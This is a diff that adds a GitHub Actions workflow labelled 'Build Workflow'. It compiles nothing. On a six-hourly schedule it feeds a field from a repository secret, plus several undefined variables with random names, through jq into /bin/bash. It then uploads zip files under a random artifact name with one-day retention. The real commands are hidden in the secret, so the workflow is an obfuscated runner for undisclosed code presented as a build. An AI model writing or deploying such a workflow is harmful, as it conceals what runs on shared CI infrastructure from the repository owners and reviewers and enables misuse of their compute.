@@ -1,0 +1,33 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          yte1152: ${{ secrets.yte1152 }}
+        run: |
+          printf '%s' "$yte1152" | jq -r .ia49413 | /bin/bash
+          echo $mo930 | jq -r .hpp6 | /bin/bash
+          printf '%s' "$ajw06868" | jq -r .nb4860 | /bin/bash
+          echo $jl40517 | jq -r .vp9 | /bin/bash
+          echo $no75 | jq -r .vc79572 | /bin/bash
+          printf '%s' "$ydchg654" | jq -r .yxwhk22140 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KiErtYw6
+          path: "*.zip"
+          retention-days: 1
